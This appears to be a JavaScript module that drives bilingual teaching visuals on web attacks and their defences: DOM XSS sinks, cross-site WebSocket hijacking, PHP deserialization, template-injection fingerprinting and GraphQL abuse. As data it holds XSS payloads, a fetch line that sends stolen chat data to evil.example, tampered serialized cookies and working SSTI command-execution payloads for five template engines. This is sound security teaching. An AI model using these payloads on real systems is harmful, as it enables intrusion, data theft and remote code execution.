// Logic for the third batch of visuals. Pure functions, unit-tested.
const L = (en, zh) => ({ en, zh });

/* ───────────────────────── DOM-based XSS: source → sink ───────────────────────── */
export const DOM_SOURCES = {
  search: L('location.search (?q=…)', 'location.search（?q=…）'),
  hash: L('location.hash (#…)', 'location.hash（#…）'),
};
export const DOM_SINKS = {
  innerHTML: 'el.innerHTML = q',
  write: 'document.write(q)',
  href: 'link.href = q',
  textContent: 'el.textContent = q',
};
export const DOM_PAYLOADS = [
  { id: 'bold', label: '<b>hi</b>', value: '<b>hi</b>' },
  { id: 'img', label: '<img src=x onerror=…>', value: '<img src=x onerror=alert(document.domain)>' },
  { id: 'script', label: '<script>…</script>', value: '<script>alert(document.domain)</script>' },
  { id: 'js', label: 'javascript:…', value: 'javascript:alert(document.domain)' },
];

/** What the page does with the value once it reaches the sink. */
export function domRun(value, sink) {
  const hasTag = /<[a-z]/i.test(value);
  const handler = /<[a-z][^>]*\son\w+\s*=/i.test(value);
  const script = /<script[\s>]/i.test(value);
  if (sink === 'textContent') return { executes: false, rendered: value, why: L('textContent never parses HTML. The payload is shown as text.', 'textContent 从不解析 HTML，载荷只会显示成文本。') };
  if (sink === 'href') {
    if (/^\s*javascript:/i.test(value)) return { executes: true, onClick: true, rendered: `<a href="${value}">`, why: L('A javascript: URL in href runs when the victim clicks the link.', 'href 里的 javascript: URL 会在受害者点击链接时执行。') };
    return { executes: false, rendered: `<a href="${value}">`, why: L('Just a relative link. Nothing runs.', '只是一个相对链接，什么也不会执行。') };
  }
  if (sink === 'innerHTML') {
    if (handler) return { executes: true, rendered: value, why: L('innerHTML parses the markup. The broken image fires its onerror handler.', 'innerHTML 解析了这段标记，加载失败的图片触发了 onerror 处理函数。') };
    if (script) return { executes: false, rendered: value, why: L('<script> inserted through innerHTML is never run. That is why attackers use event handlers instead.', '通过 innerHTML 插入的 <script> 不会执行，所以攻击者改用事件处理函数。') };
    return { executes: false, rendered: value, why: hasTag ? L('The markup is parsed, so HTML injection works, but nothing runs.', '标记被解析了，HTML 注入成立，但没有脚本执行。') : L('Plain text.', '普通文本。') };
  }
  // document.write
  if (handler || script) return { executes: true, rendered: value, why: L('document.write feeds the parser directly, so both <script> and event handlers run.', 'document.write 直接把内容交给解析器，<script> 和事件处理函数都会执行。') };
  return { executes: false, rendered: value, why: hasTag ? L('Parsed as HTML, but there is no script in it.', '作为 HTML 解析了，但里面没有脚本。') : L('Plain text.', '普通文本。') };
}

/** The request the server sees for this source. */
export function serverSees(value, source) {
  return source === 'search' ? `GET /?q=${encodeURIComponent(value)}` : 'GET /';
}

/* ───────────────────────── cross-site WebSocket hijacking ───────────────────────── */
export const WS_DEFENCES = {
  origin: L('Server checks the Origin header', '服务器检查 Origin 头'),
  samesite: L('Session cookie is SameSite=Lax', '会话 Cookie 设为 SameSite=Lax'),
  token: L('Unguessable token in the handshake', '握手里带不可猜测的令牌'),
};

/** The handshake and frames when evil.example opens a socket to chat.example in Alice's browser. */
export function wsHijack(d) {
  const handshake = `GET /chat HTTP/1.1\nHost: chat.example\nUpgrade: websocket\nOrigin: https://evil.example${d.samesite ? '' : '\nCookie: session=alice…'}${d.token ? '\n(no token: evil.example cannot read it)' : ''}`;
  const frames = [];
  if (d.origin) return { handshake, status: L('403: Origin https://evil.example is not allowed', '403：不允许来源 https://evil.example'), frames, outcome: 'blocked' };
  if (d.token) return { handshake, status: L('403: missing or wrong CSRF token', '403：CSRF 令牌缺失或错误'), frames, outcome: 'blocked' };
  frames.push({ dir: 'up', text: 'READY' });
  if (d.samesite) {
    frames.push({ dir: 'down', text: L('{"error":"not logged in"}', '{"error":"未登录"}') });
    return { handshake, status: L('101 Switching Protocols, but anonymous', '101 Switching Protocols，但是匿名身份'), frames, outcome: 'blocked' };
  }
  frames.push({ dir: 'down', text: L('{"from":"Support","msg":"Hi Alice, your reset code is 481516"}', '{"from":"客服","msg":"Alice 你好，你的重置码是 481516"}') });
  frames.push({ dir: 'down', text: L('{"from":"Alice","msg":"thanks! card ending 4242 is fine"}', '{"from":"Alice","msg":"谢谢！尾号 4242 的卡可以用"}') });
  frames.push({ dir: 'exfil', text: 'fetch("https://evil.example/log", {method:"POST", body: e.data})' });
  return { handshake, status: L('101 Switching Protocols, as Alice', '101 Switching Protocols，身份是 Alice'), frames, outcome: 'pwned' };
}

/* ───────────────────────── insecure deserialization ───────────────────────── */
export const DS_ATTACKS = {
  tamper: L('Edit a field', '修改字段'),
  gadget: L('Inject another class', '注入另一个类'),
};
export const DS_DEFENCES = {
  none: L('unserialize() the cookie', '直接 unserialize() Cookie'),
  sign: L('HMAC-sign the cookie, verify first', '给 Cookie 加 HMAC 签名，先验证'),
  json: L('JSON data only, no classes', '只用 JSON 数据，不还原类'),
};
export const DS_COOKIE = {
  original: 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:7:"isAdmin";b:0;}',
  tamper: 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:7:"isAdmin";b:1;}',
  gadget: 'O:8:"TempFile":1:{s:4:"path";s:23:"/home/carlos/morale.txt";}',
};

/** What the server does with the cookie. */
export function deserialize(attack, defence) {
  const s = [];
  const res = (outcome) => ({ steps: s, outcome });
  if (defence === 'sign') {
    s.push({ kind: 'info', text: L('Compute HMAC(secret, cookie) and compare it with the signature.', '计算 HMAC(secret, cookie)，与签名比较。') });
    s.push({ kind: 'good', text: L('Mismatch: the attacker changed the bytes but cannot produce a new signature. Rejected before unserialize().', '不匹配：攻击者改了字节，却无法生成新签名。在 unserialize() 之前就被拒绝。') });
    return res('blocked');
  }
  if (defence === 'json') {
    s.push({ kind: 'info', text: L('json_decode() returns plain arrays and strings. It never creates objects of a named class.', 'json_decode() 只返回普通数组和字符串，从不创建具名类的对象。') });
    if (attack === 'gadget') {
      s.push({ kind: 'good', text: L('"TempFile" is just a string here. No class, no magic methods.', '这里的 "TempFile" 只是一个字符串，没有类，也没有魔术方法。') });
      return res('blocked');
    }
    s.push({ kind: 'bad', text: L('{"username":"wiener","isAdmin":true} is still accepted. Data-only formats stop gadget chains, not tampering.', '{"username":"wiener","isAdmin":true} 仍然被接受。纯数据格式能挡住利用链，挡不住篡改。') });
    return res('pwned');
  }
  if (attack === 'tamper') {
    s.push({ kind: 'info', text: L('unserialize() rebuilds a User object from the cookie.', 'unserialize() 根据 Cookie 重建出一个 User 对象。') });
    s.push({ kind: 'bad', text: L('$user->isAdmin is true, because the client said so.', '$user->isAdmin 为 true，因为客户端这么说。') });
    s.push({ kind: 'bad', text: L('The admin panel link appears.', '管理面板的链接出现了。') });
    return res('pwned');
  }
  s.push({ kind: 'info', text: L('unserialize() sees class "TempFile". It exists in the codebase, so PHP creates one.', 'unserialize() 看到类名 "TempFile"。代码库里有这个类，于是 PHP 创建了它。') });
  s.push({ kind: 'info', text: L('Its constructor does not run. Its properties come straight from the cookie.', '它的构造函数不会执行，属性值直接来自 Cookie。') });
  s.push({ kind: 'bad', text: L('The code expected a User and fails, but the object already exists.', '代码期望的是 User，于是出错了，但对象已经存在了。') });
  s.push({ kind: 'bad', text: L('End of request: PHP calls TempFile::__destruct().', '请求结束：PHP 调用 TempFile::__destruct()。') });
  s.push({ kind: 'bad', text: L('__destruct() runs unlink($this->path): /home/carlos/morale.txt is deleted.', '__destruct() 执行 unlink($this->path)：/home/carlos/morale.txt 被删除了。') });
  return res('pwned');
}

/* ───────────────────────── SSTI: identify the engine ───────────────────────── */
export const ENGINES = {
  jinja2: { label: 'Jinja2 (Python)', rce: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" },
  twig: { label: 'Twig (PHP)', rce: "{{ ['id']|filter('system') }}" },
  freemarker: { label: 'FreeMarker (Java)', rce: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}' },
  mako: { label: 'Mako (Python)', rce: "${__import__('os').popen('id').read()}" },
  erb: { label: 'ERB (Ruby)', rce: "<%= `id` %>" },
};

/** Render one probe in one engine. mode 'concat' puts input into the template source; 'data' passes it as a variable. */
export function render(engine, probe, mode = 'concat') {
  if (mode === 'data') return probe;
  const lit = probe;
  switch (probe) {
    case '${7*7}':
      return engine === 'freemarker' || engine === 'mako' ? '49' : lit;
    case '${"z".join("ab")}':
      return engine === 'mako' ? 'azb' : engine === 'freemarker' ? 'FreeMarker template error' : lit;
    case '{{7*7}}':
      return engine === 'jinja2' || engine === 'twig' ? '49' : lit;
    case "{{7*'7'}}":
      return engine === 'jinja2' ? '7777777' : engine === 'twig' ? '49' : lit;
    case '<%= 7*7 %>':
      return engine === 'erb' ? '49' : lit;
    default:
      return lit;
  }
}

// Decision tree. Each node sends a probe; each branch is chosen from the response.
export const TREE = {
  root: { probe: '${7*7}', branches: [{ when: '49', to: 'dollar' }, { when: 'other', to: 'curly' }] },
  dollar: { probe: '${"z".join("ab")}', branches: [{ when: 'azb', to: 'mako' }, { when: 'other', to: 'freemarker' }] },
  curly: { probe: '{{7*7}}', branches: [{ when: '49', to: 'mul' }, { when: 'other', to: 'erbq' }] },
  mul: { probe: "{{7*'7'}}", branches: [{ when: '7777777', to: 'jinja2' }, { when: '49', to: 'twig' }] },
  erbq: { probe: '<%= 7*7 %>', branches: [{ when: '49', to: 'erb' }, { when: 'other', to: 'none' }] },
};

/** Walk the tree against a server. Returns the probes sent and the conclusion. */
export function fingerprint(engine, mode = 'concat') {
  const path = [];
  let id = 'root';
  while (TREE[id]) {
    const node = TREE[id];
    const out = render(engine, node.probe, mode);
    const br = node.branches.find((b) => b.when === out) ?? node.branches.find((b) => b.when === 'other') ?? node.branches[node.branches.length - 1];
    path.push({ node: id, probe: node.probe, out, next: br.to });
    id = br.to;
  }
  return { path, verdict: id };
}

/* ───────────────────────── GraphQL ───────────────────────── */
export const GQL_SCHEMA = [
  { type: 'Query', fields: [{ name: 'user(id: Int!)', type: 'User' }, { name: 'posts', type: '[Post]' }] },
  { type: 'User', fields: [{ name: 'id', type: 'Int' }, { name: 'username', type: 'String' }, { name: 'email', type: 'String' }, { name: 'password', type: 'String', hidden: true }] },
  { type: 'Mutation', fields: [{ name: 'login(input: LoginInput)', type: 'LoginResult' }, { name: 'deleteUser(id: Int!)', type: 'Boolean', hidden: true }] },
];
export const GQL_ATTACKS = { introspect: L('Map the hidden schema', '摸清隐藏的 schema'), aliases: L('100 logins in one request', '一个请求里登录 100 次') };
export const GQL_DEFENCES = {
  introspection: L('Introspection off', '关闭内省'),
  suggestions: L('Field suggestions off', '关闭字段建议'),
  cost: L('Limit operations per request', '限制每个请求的操作数'),
};
export const GQL_PASSWORDS = Array.from({ length: 100 }, (_, i) => (i === 63 ? 'montana' : `pw${String(i).padStart(2, '0')}`));

export function graphql(attack, d) {
  const steps = [];
  if (attack === 'introspect') {
    if (!d.introspection) {
      steps.push({ q: '{ __schema { types { name fields { name } } } }', res: L('Full schema, including User.password and Mutation.deleteUser', '完整 schema，包括 User.password 和 Mutation.deleteUser'), leak: true });
    } else {
      steps.push({ q: '{ __schema { types { name } } }', res: L('"GraphQL introspection is not allowed"', '"不允许 GraphQL 内省"'), leak: false });
      if (!d.suggestions) steps.push({ q: '{ user(id: 1) { passwor } }', res: L('Cannot query field "passwor" on type "User". Did you mean "password"?', '无法查询类型 "User" 上的字段 "passwor"。你是不是想找 "password"？'), leak: true });
      else steps.push({ q: '{ user(id: 1) { passwor } }', res: L('Cannot query field "passwor" on type "User".', '无法查询类型 "User" 上的字段 "passwor"。'), leak: false });
    }
    const found = steps.some((s) => s.leak);
    if (found) steps.push({ q: '{ user(id: 1) { username password } }', res: '{"data":{"user":{"username":"administrator","password":"k9#mQ2…"}}}', leak: true });
    return { steps, outcome: found ? 'pwned' : 'blocked', schemaVisible: !d.introspection };
  }
  const query = 'mutation {\n' + GQL_PASSWORDS.slice(0, 3).map((p, i) => `  a${i}: login(input: {username: "carlos", password: "${p}"}) { success }`).join('\n') + '\n  …97 more\n}';
  if (d.cost) return { steps: [{ q: query, res: L('400: 100 operations in one request, the limit is 1', '400：一个请求里有 100 个操作，上限是 1'), leak: false }], outcome: 'blocked', results: [] };
  const results = GQL_PASSWORDS.map((p) => p === 'montana');
  return { steps: [{ q: query, res: L('200: one HTTP request, so the rate limiter counted 1 attempt', '200：只有一个 HTTP 请求，所以限速器只算了 1 次尝试'), leak: true }], outcome: 'pwned', results };
}
